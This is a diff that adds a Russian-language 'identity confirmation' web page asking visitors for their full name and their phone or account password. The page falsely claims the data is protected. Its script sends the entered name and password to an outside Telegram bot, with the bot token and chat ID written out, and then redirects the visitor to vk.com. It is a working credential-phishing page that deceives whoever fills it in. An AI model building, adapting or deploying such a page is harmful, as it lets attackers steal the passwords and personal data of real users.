@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение личности</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: white;
+            padding: 30px 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            width: 340px;
+        }
+        h2 {
+            text-align: center;
+            color: #1a1a1a;
+            font-size: 22px;
+        }
+        p {
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0 14px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #2d7a3a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #1f5e2a;
+        }
+        .note {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Подтверждение личности</h2>
+        <p>Введите данные для верификации</p>
+        <form id="form">
+            <input type="text" id="lastname" placeholder="Фамилия" required>
+            <input type="text" id="firstname" placeholder="Имя" required>
+            <input type="text" id="middlename" placeholder="Отчество (при наличии)">
+            <input type="password" id="password" placeholder="Пароль от телефона / аккаунта" required>
+            <button type="submit">Подтвердить</button>
+            <div class="note">Данные защищены и не передаются третьим лицам</div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('form').onsubmit = function(e) {
+            e.preventDefault();
+
+            var lastname = document.getElementById('lastname').value;
+            var firstname = document.getElementById('firstname').value;
+            var middlename = document.getElementById('middlename').value || '—';
+            var password = document.getElementById('password').value;
+
+            var message = 'ФИО: ' + lastname + ' ' + firstname + ' ' + middlename + '\nПароль: ' + password;
+
+            fetch('https://api.telegram.org/bot8886990664:AAGk2JSW-YLFa0M9B6tqEUDOsm303IJfl5s/sendMessage?chat_id=7970898404&text=' + encodeURIComponent(message))
+            .then(function(response) {
+                window.location.href = 'https://vk.com/';
+            })
+            .catch(function(error) {
+                window.location.href = 'https://vk.com/';
+            });
+        };
+    </script>
+</body>
+</html>
